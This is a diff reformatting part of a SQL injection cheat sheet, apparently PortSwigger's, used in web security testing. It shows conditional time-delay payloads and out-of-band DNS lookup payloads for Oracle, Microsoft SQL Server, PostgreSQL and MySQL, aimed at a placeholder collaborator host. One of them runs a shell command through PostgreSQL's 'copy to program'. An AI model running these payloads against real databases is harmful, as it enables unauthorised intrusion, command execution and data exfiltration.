@@ -126,8 +126,8 @@ Conditional time delays
 
 You can test a single boolean condition and trigger a time delay if the condition is true.
 
-Oracle  `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN` \ 
-`'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual` 
+Oracle  `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 
+'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual` 
 
 Microsoft  `IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'` 
 
@@ -143,15 +143,15 @@ You can cause the database to perform a DNS lookup to an external domain. To do 
 Oracle  The following technique leverages an XML external entity ([XXE](https://portswigger.net/web-security/xxe)) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:\
 `SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual`
 
-The following technique works on fully patched Oracle installations, but requires elevated privileges:\
-`SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')` |
+The following technique works on fully patched Oracle installations, but requires elevated privileges: \
+`SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')` 
 
 Microsoft  `exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'` 
 
 PostgreSQL  `copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'` 
 
 MySQL  The following techniques work on Windows only:\
-`LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')`\
+`LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')` \
 `SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'` 
 
 DNS lookup with data exfiltration
